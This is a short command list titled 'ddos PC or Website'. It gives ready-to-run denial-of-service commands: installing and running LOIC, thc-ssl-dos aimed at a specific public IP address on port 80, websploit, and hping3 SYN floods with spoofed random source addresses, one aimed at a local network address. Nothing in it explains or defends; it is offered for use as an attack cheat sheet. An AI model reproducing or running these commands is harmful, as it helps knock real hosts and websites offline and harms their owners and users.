# ddos PC or Website
#install Loic
#apt-get install git-core monodevelop

cd loic/ && ./loic.sh run
thc-ssl-dos -l 200 103.53.198.154 80 --accept
websploit
hping3 -c 100000 -d 120 -S -p 80 --flood --rand-source 
hping3 -c 1000000 --flood -S 192.168.1.108 > For Pc
